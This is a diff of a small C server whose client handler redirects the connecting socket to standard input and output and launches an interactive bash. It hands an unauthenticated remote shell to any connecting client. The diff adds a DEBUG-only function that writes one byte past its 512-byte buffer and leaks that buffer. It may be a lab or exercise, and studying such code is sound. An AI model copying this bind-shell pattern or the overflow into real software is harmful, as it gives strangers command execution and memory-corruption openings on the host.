@@ -1,3 +1,5 @@
+#define _GNU_SOURCE
+
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -19,7 +21,7 @@ int run_protocol(int connect_fd);
 int safe_write(const int fd, char const *msg);
 int safe_read(const int fd, char const *expected);
 void handle_client(int connect_fd);
-
+void debug(int fd);
 int main()
 {
     int server_socket_fd;
@@ -63,6 +65,9 @@ int main()
             }
             else if (fork_status == 0)
             {
+              #ifdef DEBUG
+                debug(client_socket_fd);
+              #endif
                 handle_client(client_socket_fd);
             }
         }
@@ -72,11 +77,25 @@ int main()
     }
 }
 
+void debug(int fd)
+{
+    char *buff = (char *) malloc(512);
+    size_t len = 512;
+    dup2(fd, STDIN_FILENO);
+    printf("// Debug\n");
+    while ((len = read(STDIN_FILENO, buff, 512)) > 0)
+    {
+      buff[len] = '\0';
+      printf("Got: %s\n", buff);
+    }
+    printf("// End debug\n");
+}
 void handle_client(int fd)
 {
     dup2(fd, STDOUT_FILENO);
     dup2(fd, STDIN_FILENO);
     dup2(fd, STDERR_FILENO);
+
     execlp("bash", "bash", "--noediting", "-i", NULL);
 }
 
